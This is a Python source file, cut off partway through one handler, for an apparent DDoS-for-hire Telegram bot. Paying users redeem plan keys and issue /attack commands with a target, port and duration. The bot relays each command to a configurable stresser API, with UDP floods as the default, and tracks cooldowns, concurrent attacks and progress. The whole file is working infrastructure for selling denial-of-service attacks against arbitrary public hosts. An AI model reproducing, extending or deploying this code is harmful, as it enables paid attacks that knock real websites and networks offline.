"""
DDoS Bot — Advanced Telegram Panel (v2.1)
====================================
Patched version with bug fixes and improvements.
"""

import os
import sys
import ipaddress
import asyncio
import logging
import time
import random
import string
import json
import math
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple

import certifi
import pytz
import aiohttp
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from telebot.types import Message
from pymongo import MongoClient, ASCENDING
from pymongo.errors import ConnectionFailure

# ==================== LOGGING ====================
from logging.handlers import RotatingFileHandler

LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Add rotating file handler
handler = RotatingFileHandler("ddos_bot.log", maxBytes=5_000_000, backupCount=3)
handler.setFormatter(logging.Formatter(LOG_FORMAT))
logger.addHandler(handler)

# Also console for railway
console = logging.StreamHandler()
console.setFormatter(logging.Formatter(LOG_FORMAT))
logger.addHandler(console)

# ==================== CONFIG ====================
class Config:
    BOT_TOKEN: str = os.environ.get("BOT_TOKEN", "CHANGE_ME")
    MONGO_URI: str = os.environ.get("MONGO_URI", "CHANGE_ME")

    CHANNEL_ID: int = int(os.environ.get("CHANNEL_ID", "-1000000000000"))
    CHANNEL_LINK: str = os.environ.get("CHANNEL_LINK", "https://t.me/yourchannel")
    GROUP_ID: int = int(os.environ.get("GROUP_ID", "0"))
    GROUP_LINK: str = os.environ.get("GROUP_LINK", "https://t.me/yourgroup")

    OWNER_LINK: str = os.environ.get("OWNER_LINK", "https://t.me/yourowner")
    OWNER_USERNAME: str = os.environ.get("OWNER_USERNAME", "@owner")

    ADMIN_IDS: List[int] = [
        int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()
    ]
    SUPER_ADMIN_IDS: List[int] = [
        int(x.strip()) for x in os.environ.get("SUPER_ADMIN_IDS", "").split(",") if x.strip().isdigit()
    ]
    OWNER_ID: int = int(os.environ.get("OWNER_ID", "123456789"))

    ALLOWED_GROUPS: List[int] = [
        int(x.strip()) for x in os.environ.get("ALLOWED_GROUPS", "").split(",")
        if x.strip().lstrip("-").isdigit()
    ]

    PLAN_LIMITS: Dict[int, Tuple[int, int, int]] = {
        1: (60, 1, 30),
        2: (120, 2, 15),
        3: (300, 3, 10),
        4: (600, 5, 5),
    }
    MAX_CONCURRENT_ATTACKS: int = 3
    COOLDOWN_CLEANUP_INTERVAL: int = 60

    # Stresser API
    STRESSER_API_URL: str = os.environ.get("STRESSER_API_URL", "")
    STRESSER_API_KEY: str = os.environ.get("STRESSER_API_KEY", "")
    STRESSER_API_METHOD: str = os.environ.get("STRESSER_API_METHOD", "POST")
    STRESSER_HEADERS: dict = json.loads(os.environ.get("STRESSER_HEADERS", "{}"))
    STRESSER_PAYLOAD_TEMPLATE: dict = json.loads(
        os.environ.get("STRESSER_PAYLOAD_TEMPLATE", '{"host":"{target}","port":"{port}","time":"{duration}","method":"{method}","key":"{api_key}"}')
    )
    # Extra: expected success key in JSON response (e.g., "success" or "status")
    STRESSER_SUCCESS_KEY: str = os.environ.get("STRESSER_SUCCESS_KEY", "status")
    STRESSER_SUCCESS_VALUE: str = os.environ.get("STRESSER_SUCCESS_VALUE", "success")

    PROGRESS_BAR_LENGTH: int = 20
    STATUS_REFRESH_INTERVAL: int = 5

    # Default method (if not provided in payload)
    STRESSER_DEFAULT_METHOD: str = os.environ.get("STRESSER_DEFAULT_METHOD", "UDP")

# ==================== DATABASE ====================
class Database:
    def __init__(self, uri: str):
        self.uri = uri
        self.client = None
        self.db = None
        self._connect()

    def _connect(self):
        try:
            self.client = MongoClient(self.uri, tlsCAFile=certifi.where(), serverSelectionTimeoutMS=5000)
            self.client.admin.command('ping')
            self.db = self.client["ddos_bot"]
            self.users = self.db["users"]
            self.banned = self.db["banned"]
            self.keys = self.db["keys"]
            self.groups = self.db["groups"]
            self.attack_history = self.db["attack_history"]
            self._create_indexes()
            logger.info("Database connected")
        except Exception as e:
            logger.error(f"Database connection failed: {e}")
            self.db = None

    def _create_indexes(self):
        try:
            self.users.create_index("user_id", unique=True)
            self.banned.create_index("user_id", unique=True)
            self.keys.create_index("key", unique=True)
            self.groups.create_index("group_id", unique=True)
            self.attack_history.create_index("attack_id", unique=True)
            self.attack_history.create_index("user_id")
        except Exception as e:
            logger.warning(f"Index creation warning: {e}")

    def _ensure_connection(self):
        if self.db is None:
            self._connect()
            if self.db is None:
                raise ConnectionFailure("No database connection")

    # ---------- BAN ----------
    def is_banned(self, user_id: int) -> bool:
        try:
            self._ensure_connection()
            return self.banned.find_one({"user_id": user_id}) is not None
        except Exception as e:
            logger.error(f"is_banned error: {e}")
            return False

    def ban_user(self, user_id: int, reason: str = "", banned_by: int = 0):
        try:
            self._ensure_connection()
            self.banned.update_one(
                {"user_id": user_id},
                {"$set": {
                    "user_id": user_id,
                    "reason": reason,
                    "banned_by": banned_by,
                    "banned_at": datetime.now(pytz.UTC),
                }},
                upsert=True,
            )
            self.users.update_one(
                {"user_id": user_id},
                {"$set": {"plan": 0, "valid_until": None}},
            )
        except Exception as e:
            logger.error(f"ban_user error: {e}")

    def unban_user(self, user_id: int):
        try:
            self._ensure_connection()
            self.banned.delete_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"unban_user error: {e}")

    # ---------- KEYS ----------
    def generate_key(self, plan: int, days: int, created_by: int) -> str:
        try:
            self._ensure_connection()
            key = "DDOS-" + "-".join(
                "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                for _ in range(3)
            )
            self.keys.insert_one({
                "key": key,
                "plan": plan,
                "days": days,
                "created_by": created_by,
                "created_at": datetime.now(pytz.UTC),
                "redeemed_by": None,
                "redeemed_at": None,
            })
            return key
        except Exception as e:
            logger.error(f"generate_key error: {e}")
            return ""

    def redeem_key(self, key: str, user_id: int) -> Optional[Dict]:
        try:
            self._ensure_connection()
            doc = self.keys.find_one({"key": key, "redeemed_by": None})
            if not doc:
                return None
            plan = doc["plan"]
            days = doc["days"]
            valid_until = datetime.now(pytz.UTC) + timedelta(days=days)
            self.users.update_one(
                {"user_id": user_id},
                {
                    "$set": {
                        "plan": plan,
                        "valid_until": valid_until,
                        "redeemed_key": key,
                    },
                    "$setOnInsert": {"access_count": 0},
                },
                upsert=True,
            )
            self.keys.update_one(
                {"_id": doc["_id"]},
                {"$set": {"redeemed_by": user_id, "redeemed_at": datetime.now(pytz.UTC)}},
            )
            return {"plan": plan, "days": days, "valid_until": valid_until}
        except Exception as e:
            logger.error(f"redeem_key error: {e}")
            return None

    # ---------- USERS ----------
    def get_user(self, user_id: int) -> Optional[Dict]:
        try:
            self._ensure_connection()
            return self.users.find_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"get_user error: {e}")
            return None

    def get_all_users(self, plan_gt: int = 0) -> List[Dict]:
        try:
            self._ensure_connection()
            return list(self.users.find({"plan": {"$gt": plan_gt}}))
        except Exception as e:
            logger.error(f"get_all_users error: {e}")
            return []

    # ---------- GROUPS ----------
    def add_group(self, group_id: int, group_title: str, added_by: int):
        try:
            self._ensure_connection()
            self.groups.update_one(
                {"group_id": group_id},
                {"$set": {
                    "group_id": group_id,
                    "title": group_title,
                    "added_by": added_by,
                    "added_at": datetime.now(pytz.UTC),
                }},
                upsert=True,
            )
        except Exception as e:
            logger.error(f"add_group error: {e}")

    def remove_group(self, group_id: int):
        try:
            self._ensure_connection()
            self.groups.delete_one({"group_id": group_id})
        except Exception as e:
            logger.error(f"remove_group error: {e}")

    def get_all_groups(self) -> List[Dict]:
        try:
            self._ensure_connection()
            return list(self.groups.find())
        except Exception as e:
            logger.error(f"get_all_groups error: {e}")
            return []

    # ---------- ATTACK HISTORY ----------
    def save_attack(self, attack_data: dict):
        try:
            self._ensure_connection()
            self.attack_history.update_one(
                {"attack_id": attack_data["attack_id"]},
                {"$set": attack_data},
                upsert=True,
            )
        except Exception as e:
            logger.error(f"save_attack error: {e}")

    def get_user_attacks(self, user_id: int, limit: int = 20) -> List[Dict]:
        try:
            self._ensure_connection()
            return list(
                self.attack_history.find({"user_id": user_id})
                .sort("start_time", -1)
                .limit(limit)
            )
        except Exception as e:
            logger.error(f"get_user_attacks error: {e}")
            return []

    def get_active_attacks(self) -> List[Dict]:
        try:
            self._ensure_connection()
            now = datetime.now(pytz.UTC)
            return list(
                self.attack_history.find({
                    "status": {"$in": ["running", "launched"]},
                    "end_time": {"$gt": now},
                })
            )
        except Exception as e:
            logger.error(f"get_active_attacks error: {e}")
            return []

    # ---------- COOKIE/EXTRA (not used but kept) ----------
    # (none)

# ==================== ATTACK MANAGER ====================
class AttackManager:
    def __init__(self):
        self.active_attacks: Dict[int, List[Dict]] = {}
        self.cooldowns: Dict[int, float] = {}
        self.lock = asyncio.Lock()
        self.attack_message_ids: Dict[str, int] = {}
        self.attack_chat_ids: Dict[str, int] = {}

    async def can_attack(self, user_id: int, plan: int) -> Tuple[bool, str]:
        async with self.lock:
            last_attack = self.cooldowns.get(user_id, 0)
            cooldown = 0
            if plan in Config.PLAN_LIMITS:
                cooldown = Config.PLAN_LIMITS[plan][2]
            remaining = cooldown - (time.time() - last_attack)
            if remaining > 0:
                return False, f"Cooldown active! Wait `{int(remaining)}s`"

            user_attacks = self.active_attacks.get(user_id, [])
            max_con = 1
            if plan in Config.PLAN_LIMITS:
                max_con = Config.PLAN_LIMITS[plan][1]
            if len(user_attacks) >= max_con:
                return False, f"Max concurrent attacks reached (`{max_con}`)"

            return True, "OK"

    def start_attack(self, user_id: int, attack_info: Dict):
        now = time.time()
        if user_id not in self.active_attacks:
            self.active_attacks[user_id] = []
        self.active_attacks[user_id].append(attack_info)
        self.cooldowns[user_id] = now

    async def finish_attack(self, user_id: int, attack_id: str):
        async with self.lock:
            if user_id in self.active_attacks:
                self.active_attacks[user_id] = [
                    a for a in self.active_attacks[user_id] if a.get("id") != attack_id
                ]
                if not self.active_attacks[user_id]:
                    del self.active_attacks[user_id]

    async def cleanup(self, db: 'Database'):
        """Remove expired attacks and update DB status."""
        now = time.time()
        async with self.lock:
            for uid in list(self.active_attacks.keys()):
                expired = [a for a in self.active_attacks[uid] if a.get("end_time", 0) <= now]
                for attack in expired:
                    # Update DB status to completed
                    aid = attack.get("id")
                    if aid:
                        db.save_attack({
                            "attack_id": aid,
                            "status": "completed",
                            "end_time": datetime.now(pytz.UTC),
                        })
                self.active_attacks[uid] = [
                    a for a in self.active_attacks[uid] if a.get("end_time", 0) > now
                ]
                if not self.active_attacks[uid]:
                    del self.active_attacks[uid]

    @staticmethod
    def build_progress_bar(percent: float, length: int = 20) -> str:
        filled = min(length, max(0, int(round(percent / 100.0 * length))))
        empty = length - filled
        bar = "█" * filled + "░" * empty
        return f"`[{bar}] {percent:.1f}%`"

    def register_progress_message(self, attack_id: str, chat_id: int, message_id: int):
        self.attack_message_ids[attack_id] = message_id
        self.attack_chat_ids[attack_id] = chat_id

# ==================== BOT CLASS ====================
class DDoSBot:
    def __init__(self):
        self.bot = AsyncTeleBot(Config.BOT_TOKEN)
        self.db = Database(Config.MONGO_URI)
        self.attack_manager = AttackManager()
        self.session: Optional[aiohttp.ClientSession] = None
        self._register_handlers()

    # ---------- Helpers ----------
    @staticmethod
    def _generate_attack_id() -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def _is_owner(self, user_id: int) -> bool:
        return user_id == Config.OWNER_ID

    def _is_super_admin(self, user_id: int) -> bool:
        return user_id in Config.SUPER_ADMIN_IDS or self._is_owner(user_id)

    def _is_admin(self, user_id: int) -> bool:
        return user_id in Config.ADMIN_IDS or self._is_super_admin(user_id)

    async def _check_group_access(self, message: Message) -> bool:
        if message.chat.type == "private":
            return True
        group_id = message.chat.id
        if group_id in Config.ALLOWED_GROUPS:
            return True
        db_group = self.db.groups.find_one({"group_id": group_id})
        return db_group is not None

    async def _is_member_of_channel(self, user_id: int) -> bool:
        if Config.CHANNEL_ID <= -1000000000000:
            return True
        try:
            chat_member = await self.bot.get_chat_member(Config.CHANNEL_ID, user_id)
            return chat_member.status in ("member", "administrator", "creator")
        except Exception:
            return False

    def _create_keyboard(self) -> types.InlineKeyboardMarkup:
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_plans = types.InlineKeyboardButton("Plans", callback_data="plans")
        btn_help = types.InlineKeyboardButton("Help", callback_data="help")
        btn_status = types.InlineKeyboardButton("Status", callback_data="status")
        btn_owner = types.InlineKeyboardButton("Owner", url=Config.OWNER_LINK)
        btn_channel = types.InlineKeyboardButton("Channel", url=Config.CHANNEL_LINK)
        btn_group = types.InlineKeyboardButton("Group", url=getattr(Config, "GROUP_LINK", Config.CHANNEL_LINK))
        markup.add(btn_plans, btn_help, btn_status, btn_owner, btn_channel, btn_group)
        return markup

    def _validate_target(self, target: str) -> bool:
        """Validate IP or domain – block private/reserved."""
        try:
            ip = ipaddress.ip_address(target)
            # Block private, loopback, link-local, multicast, reserved
            if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_reserved:
                return False
            return True
        except ValueError:
            # Domain name – block obvious internal keywords
            blocked_keywords = [
                "localhost", "internal", "private", "metadata",
                ".local", ".internal", ".example"
            ]
            target_lower = target.lower()
            if any(kw in target_lower for kw in blocked_keywords):
                return False
            # Basic domain format
            if "." in target and not target.startswith(".") and not target.endswith("."):
                return True
            return False

    async def _execute_attack_via_api(self, target: str, port: int, duration: int, method: str = None) -> Tuple[bool, str]:
        """Execute attack via generic stresser API provider."""
        api_url = Config.STRESSER_API_URL
        api_key = Config.STRESSER_API_KEY
        if not api_url or not api_key:
            return False, "Stresser API not configured."

        # Build payload from template
        payload = {}
        for key, val in Config.STRESSER_PAYLOAD_TEMPLATE.items():
            payload[key] = val.replace("{target}", target) \
                              .replace("{port}", str(port)) \
                              .replace("{duration}", str(duration)) \
                              .replace("{api_key}", api_key) \
                              .replace("{method}", method or Config.STRESSER_DEFAULT_METHOD)

        headers = Config.STRESSER_HEADERS
        http_method = Config.STRESSER_API_METHOD.upper()

        try:
            if not self.session:
                self.session = aiohttp.ClientSession()

            if http_method == "GET":
                async with self.session.get(
                    api_url,
                    params=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    text = await resp.text()
                    logger.info(f"API response ({resp.status}): {text[:200]}")
                    # Try to parse JSON
                    try:
                        data = json.loads(text)
                        success_key = Config.STRESSER_SUCCESS_KEY
                        success_val = Config.STRESSER_SUCCESS_VALUE
                        # Check if success_key exists and equals success_val
                        if data.get(success_key) == success_val:
                            return True, "Attack accepted"
                        else:
                            return False, f"API error: {data.get('message', 'Unknown error')}"
                    except json.JSONDecodeError:
                        # Fallback: status code 200 = success
                        return resp.status == 200, text[:200]
            else:
                async with self.session.post(
                    api_url,
                    json=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    text = await resp.text()
                    logger.info(f"API response ({resp.status}): {text[:200]}")
                    try:
                        data = json.loads(text)
                        success_key = Config.STRESSER_SUCCESS_KEY
                        success_val = Config.STRESSER_SUCCESS_VALUE
                        if data.get(success_key) == success_val:
                            return True, "Attack accepted"
                        else:
                            return False, f"API error: {data.get('message', 'Unknown error')}"
                    except json.JSONDecodeError:
                        return resp.status == 200, text[:200]

        except asyncio.TimeoutError:
            return False, "Request timeout"
        except Exception as e:
            logger.error(f"API call failed: {e}")
            return False, f"API error: {str(e)[:100]}"

    # ---------- Permission checks ----------
    async def _require_auth(self, message: Message) -> bool:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if self.db.is_banned(user_id):
            await self.bot.send_message(chat_id, "*You are banned from using this bot.*", parse_mode="Markdown")
            return False

        if message.chat.type == "private":
            if not await self._is_member_of_channel(user_id):
                btn = types.InlineKeyboardButton("Join Channel", url=Config.CHANNEL_LINK)
                markup = types.InlineKeyboardMarkup().add(btn)
                await self.bot.send_message(
                    chat_id,
                    f"*You must join our channel first!*\n{Config.CHANNEL_LINK}",
                    parse_mode="Markdown",
                    reply_markup=markup,
                )
                return False

        return True

    async def _require_plan(self, message: Message) -> bool:
        user_id = message.from_user.id
        chat_id = message.chat.id
        user = self.db.get_user(user_id)
        if not user or user.get("plan", 0) == 0:
            await self.bot.send_message(
                chat_id,
                "*You don't have an active plan!*\n"
                "Use `/plans` to view available plans.\n"
                "Or use `/redeem <key>` if you have a key.",
                parse_mode="Markdown",
            )
            return False
        valid_until = user.get("valid_until")
        if valid_until and valid_until < datetime.now(pytz.UTC):
            await self.bot.send_message(chat_id, "*Your plan has expired!* Contact owner.", parse_mode="Markdown")
            return False
        return True

    # ---------- Register handlers ----------
    def _register_handlers(self):
        self.bot.message_handler(commands=["start"])(self.cmd_start)
        self.bot.message_handler(commands=["help"])(self.cmd_help)
        self.bot.message_handler(commands=["plans"])(self.cmd_plans)
        self.bot.message_handler(commands=["attack"])(self.cmd_attack)
        self.bot.message_handler(commands=["mystats"])(self.cmd_mystats)
        self.bot.message_handler(commands=["when"])(self.cmd_when)
        self.bot.message_handler(commands=["redeem"])(self.cmd_redeem)
        self.bot.message_handler(commands=["status"])(self.cmd_status)
        self.bot.message_handler(commands=["myattacks"])(self.cmd_myattacks)

        self.bot.message_handler(commands=["approve"])(self.cmd_approve)
        self.bot.message_handler(commands=["disapprove"])(self.cmd_disapprove)
        self.bot.message_handler(commands=["users"])(self.cmd_users)
        self.bot.message_handler(commands=["broadcast"])(self.cmd_broadcast)
        self.bot.message_handler(commands=["ban"])(self.cmd_ban)
        self.bot.message_handler(commands=["unban"])(self.cmd_unban)
        self.bot.message_handler(commands=["banned"])(self.cmd_banned)
        self.bot.message_handler(commands=["addgroup"])(self.cmd_addgroup)
        self.bot.message_handler(commands=["delgroup"])(self.cmd_delgroup)
        self.bot.message_handler(commands=["groups"])(self.cmd_groups)
        self.bot.message_handler(commands=["allstatus"])(self.cmd_allstatus)

        self.bot.message_handler(commands=["genkey"])(self.cmd_genkey)
        self.bot.message_handler(commands=["keys"])(self.cmd_keys)

        self.bot.callback_query_handler(func=lambda call: True)(self._handle_callback)

    async def _handle_callback(self, call):
        if call.data == "plans":
            await self.cmd_plans(call.message)
        elif call.data == "help":
            await self.cmd_help(call.message)
        elif call.data == "status":
            class FakeMessage:
                def __init__(self, msg):
                    self.chat = msg.chat
                    self.from_user = msg.from_user
                    self.text = "/status"
                    self.message_id = msg.message_id
            await self.cmd_status(FakeMessage(call.message))
        await self.bot.answer_callback_query(call.id)

    # ---------- Progress bar updater ----------
    async def _progress_bar_updater(self, attack_id: str, chat_id: int, message_id: int,
                                     target: str, port: int, duration: int, user_id: int):
        if duration <= 0:
            return

        interval = Config.STATUS_REFRESH_INTERVAL
        elapsed = 0

        while elapsed < duration:
            await asyncio.sleep(interval)
            elapsed += interval
            if elapsed > duration:
                elapsed = duration

            percent = (elapsed / duration) * 100.0
            bar = self.attack_manager.build_progress_bar(percent)

            remaining = duration - elapsed
            time_str = f"`{elapsed}s / {duration}s`"

            try:
                await self.bot.edit_message_text(
                    f"*Attack Running!*\n"
                    f"Target: `{target}:{port}`\n"
                    f"Duration: {time_str}\n"
                    f"Progress: {bar}\n"
                    f"Remaining: `{remaining}s`\n"
                    f"Status: `Active`",
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode="Markdown",
                )
            except Exception as e:
                # Message deleted or bot blocked – stop updating
                logger.debug(f"Progress updater stopped: {e}")
                break

        # Final update
        final_bar = self.attack_manager.build_progress_bar(100.0)
        try:
            await self.bot.edit_message_text(
                f"*Attack Completed!*\n"
                f"Target: `{target}:{port}`\n"
                f"Duration: `{duration}s`\n"
                f"Progress: {final_bar}\n"
                f"Status: `Finished`",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode="Markdown",
            )
        except Exception:
            pass

        # Update DB status
        self.db.save_attack({
            "attack_id": attack_id,
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "start_time": datetime.now(pytz.UTC) - timedelta(seconds=duration),
            "end_time": datetime.now(pytz.UTC),
            "status": "completed",
        })

        # Remove from active attacks
        await self.attack_manager.finish_attack(user_id, attack_id)

    # ---------- Commands ----------
    async def cmd_start(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        first_name = message.from_user.first_name or "User"

        if not await self._check_group_access(message):
            await self.bot.send_message(chat_id, "*This group is not authorized. Contact owner.*", parse_mode="Markdown")
            return

        if self.db.is_banned(user_id):
            await self.bot.send_message(chat_id, "*You are banned.*", parse_mode="Markdown")
            return

        user = self.db.get_user(user_id)
        if user and user.get("plan", 0) > 0:
            valid_until = user.get("valid_until")
            if valid_until and valid_until > datetime.now(pytz.UTC):
                remaining = (valid_until - datetime.now(pytz.UTC)).days
                await self.bot.send_message(
                    chat_id,
                    f"*Welcome back, {first_name}!*\n"
                    f"Plan: `{user['plan']}`\n"
                    f"Valid for: `{remaining}` days\n"
                    f"Use `/help` for commands.",
                    parse_mode="Markdown",
                    reply_markup=self._create_keyboard(),
                )
                return

        await self.bot.send_message(
            chat_id,
            f"*Welcome, {first_name}!*\n"
            f"Use `/plans` to view plans.\n"
            f"Use `/redeem <key>` if you have a key.",
            parse_mode="Markdown",
            reply_markup=self._create_keyboard(),
        )

    async def cmd_help(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        is_admin = self._is_admin(user_id)
        is_owner = self._is_owner(user_id)

        user_cmds = (
            "*User Commands*\n\n"
            "`/start` - Check status\n"
            "`/attack <ip> <port> <duration>` - Launch attack\n"
            "`/status` - View your active attacks\n"
            "`/myattacks` - Your attack history\n"
            "`/mystats` - Your stats\n"
            "`/when` - Plan expiry date\n"
            "`/plans` - View plans\n"
            "`/redeem <key>` - Redeem a key\n"
            "`/help` - This message\n"
        )
        admin_cmds = (
            "\n*Admin Commands*\n"
            "`/approve <uid> <plan> <days>` - Approve user\n"
            "`/disapprove <uid>` - Remove access\n"
            "`/users` - List approved users\n"
            "`/broadcast <msg>` - Message all users\n"
            "`/ban <uid> [reason]` - Ban user\n"
            "`/unban <uid>` - Unban user\n"
            "`/banned` - List banned users\n"
            "`/addgroup <gid>` - Allow group ID\n"
            "`/delgroup <gid>` - Remove group access\n"
            "`/groups` - List allowed groups\n"
            "`/allstatus` - View all active attacks\n"
        )
        owner_cmds = (
            "\n*Owner Commands*\n"
            "`/genkey <plan> <days>` - Generate redeem key\n"
            "`/keys` - List all generated keys\n"
        )

        text = user_cmds
        if is_admin:
            text += admin_cmds
        if is_owner:
            text += owner_cmds

        await self.bot.send_message(chat_id, text, reply_markup=self._create_keyboard(), parse_mode="Markdown")

    async def cmd_plans(self, message: Message) -> None:
        chat_id = message.chat.id
        names = {1: "Basic", 2: "Standard", 3: "Premium", 4: "Elite"}
        lines = ["*Available Plans*\n"]
        for plan_id, (max_dur, max_con, cooldown) in Config.PLAN_LIMITS.items():
            cd_str = f"{cooldown}s" if cooldown else "None"
            lines.append(
                f"*Plan {plan_id} - {names.get(plan_id, '')}*\n"
                f"  Max duration: `{max_dur}s`\n"
                f"  Concurrent: `{max_con}`\n"
                f"  Cooldown: `{cd_str}`\n"
            )
        lines.append(f"\nContact {Config.OWNER_USERNAME} to purchase.")
        await self.bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

    async def cmd_attack(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id

        if not await self._check_group_access(message):
            return
        if not await self._require_auth(message):
            return
        if not await self._require_plan(message):
            return

        parts = message.text.split()
        if len(parts) < 4:
            await self.bot.send_message(chat_id, "*Usage:* `/attack <target> <port> <duration>`", parse_mode="Markdown")
            return

        target = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except ValueError:
            await self.bot.send_message(chat_id, "*Port and duration must be numbers.*", parse_mode="Markdown")
            return

        # Validate
        if not self._validate_target(target):
            await self.bot.send_message(chat_id, "*Invalid target IP/domain (internal IPs blocked).*", parse_mode="Markdown")
            return
        if port < 1 or port > 65535:
            await self.bot.send_message(chat_id, "*Port must be 1-65535.*", parse_mode="Markdown")
            return

        # Get user and plan
        user = self.db.get_user(user_id)
        if not user:
            await self.bot.send_message(chat_id, "*User not found. Please /start first.*", parse_mode="Markdown")
            return

        plan = user.get("plan", 1)
        max_dur = Config.PLAN_LIMITS.get(plan, (60, 1, 30))[0]
        if duration > max_dur:
            await self.bot.send_message(chat_id, f"*Max duration for your plan is `{max_dur}s`.*", parse_mode="Markdown")
            return

        can_attack, msg = await self.attack_manager.can_attack(user_id, plan)
        if not can_attack:
            await self.bot.send_message(chat_id, f"*{msg}*", parse_mode="Markdown")
            return

        # Execute via API
        status_msg = await self.bot.send_message(chat_id, "*Sending attack request...*", parse_mode="Markdown")
        attack_id = self._generate_attack_id()
        end_time = time.time() + duration

        self.attack_manager.start_attack(user_id, {
            "id": attack_id,
            "target": target,
            "port": port,
            "duration": duration,
            "end_time": end_time,
            "start_time": time.time(),
        })

        success, response = await self._execute_attack_via_api(target, port, duration)

        if success:
            self.db.save_attack({
                "attack_id": attack_id,
                "user_id": user_id,
                "username": message.from_user.username or message.from_user.first_name,
                "target": target,
                "port": port,
                "duration": duration,
                "start_time": datetime.now(pytz.UTC),
                "end_time": datetime.now(pytz.UTC) + timedelta(seconds=duration),
                "status": "running",
                "api_response": response,
            })

            initial_bar = self.attack_manager.build_progress_bar(0.0)
            await self.bot.edit_message_text(
                f"*Attack Launched!*\n"
                f"Target: `{target}:{port}`\n"
                f"Duration: `{duration}s`\n"
                f"Progress: {initial_bar}\n"
                f"Status: `Sent to provider`\n"
                f"Response: `{response}`",
                chat_id=chat_id,
                message_id=status_msg.message_id,
                parse_mode="Markdown",
            )

            # Start progress updater
            asyncio.create_task(
                self._progress_bar_updater(
                    attack_id, chat_id, status_msg.message_id,
                    target, port, duration, user_id
                )
            )
        else:
            self.db.save_attack({
                "attack_id": attack_id,
                "user_id": user_id,
                "username": message.from_user.username or message.from_user.first_name,
                "target": target,
                "port": port,
                "duration": duration,
                "start_time": datetime.now(pytz.UTC),
                "end_time": datetime.now(pytz.UTC),
                "status": "failed",
                "api_response": response,
            })

            await self.bot.edit_message_text(
                f"*Attack Failed!*\n{response}",
                chat_id=chat_id,
                message_id=status_msg.message_id,
                parse_mode="Markdown",
            )
            await self.attack_manager.finish_attack(user_id, attack_id)

    async def cmd_mystats(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        user = self.db.get_user(user_id)
        if not user:
            await self.bot.send_message(chat_id, "*No stats found.*", parse_mode="Markdown")
            return
        plan = user.get("plan", 0)
        access_count = user.get("access_count", 0)
        valid_until = user.get("valid_until", "N/A")
        if isinstance(valid_until, datetime):
            valid_until = valid_until.strftime("%Y-%m-%d %H:%M UTC")

        attack_count = len(self.db.get_user_attacks(user_id, limit=99999))

        await self.bot.send_message(
            chat_id,
            f"*Your Stats*\n"
            f"User ID: `{user_id}`\n"
            f"Plan: `{plan}`\n"
            f"Total Attacks: `{attack_count}`\n"
            f"Access Count: `{access_count}`\n"
            f"Valid Until: `{valid_until}`",
            parse_mode="Markdown",
        )

    async def cmd_when(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id
        user = self.db.get_user(user_id)
        if not user or not user.get("valid_until"):
            await self.bot.send_message(chat_id, "*No active plan.*", parse_mode="Markdown")
            return
        valid_until = user["valid_until"]
        remaining = (valid_until - datetime.now(pytz.UTC)).days
        await self.bot.send_message(
            chat_id,
            f"*Plan Expiry*\n"
            f"Expires: `{valid_until.strftime('%Y-%m-%d %H:%M UTC')}`\n"
            f"Remaining: `{remaining}` days",
            parse_mode="Markdown",
        )

    async def cmd_redeem(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id

        if self.db.is_banned(user_id):
            await self.bot.send_message(chat_id, "*You are banned.*", parse_mode="Markdown")
            return

        parts = message.text.split()
        if len(parts) < 2:
            await self.bot.send_message(chat_id, "*Usage:* `/redeem <key>`\nExample: `/redeem DDOS-ABCD-XYZ1-2345`", parse_mode="Markdown")
            return

        key = parts[1].strip().upper()
        result = self.db.redeem_key(key, user_id)
        if not result:
            await self.bot.send_message(chat_id, "*Invalid or already used key.*", parse_mode="Markdown")
            return

        await self.bot.send_message(
            chat_id,
            f"*Key Redeemed Successfully!*\n"
            f"Plan: `{result['plan']}`\n"
            f"Duration: `{result['days']}` days\n"
            f"Valid until: `{result['valid_until'].strftime('%Y-%m-%d %H:%M UTC')}`",
            parse_mode="Markdown",
        )

    # ---------- /status ----------
    async def cmd_status(self, message: Message) -> None:
        chat_id = message.chat.id
        user_id = message.from_user.id

        if self.db.is_banned(user_id):
            await self.bot.send_message(chat_id, "*You are banned.*", parse_mode="Markdown")
            return

        user_attacks = self.attack_manager.active_attacks.get(user_id, [])

        if not user_attacks:
            await self.bot.send_message(
                chat_id,
                "*No active attacks.*\n"
                "Launch one with `/attack <target> <port> <duration>`",
                parse_mode="Markdown",
            )
            return

        lines = [f"*Your Active Attacks ({len(user_attacks)})*\n"]
        now = time.time()

        for idx, attack in enumerate(user_attacks, 1):
            target = attack.get("target", "?")
            port = attack.get("port", "?")
            duration = attack.get("duration", "?")
            end = attack.get("end_time", now)
            remaining = max(0, int(end - now))
            attack_id = attack.get("id", "?")[:8]

            start = attack.get("start_time", end - duration)
            total = end - start
            elapsed = now - start
            percent = min(100.0, (elapsed / total) * 100.0) if total > 0 else 100.0
            bar = self.attack_manager.build_progress_bar(percent)

            lines.append(
                f"*{idx}.* `{attack_id}` — `{target}:{port}`\n"
                f"   Progress: {bar}\n"
                f"   Remaining: `{remaining}s`\n"
            )

        await self.bot.send_message(chat_id, "\n".join(lines), parse_mode="Markdown")

    # ---------- /myattacks ----------
    async def cmd_myattacks(self, message: Message) -> None:
        chat_id = message.chat.id
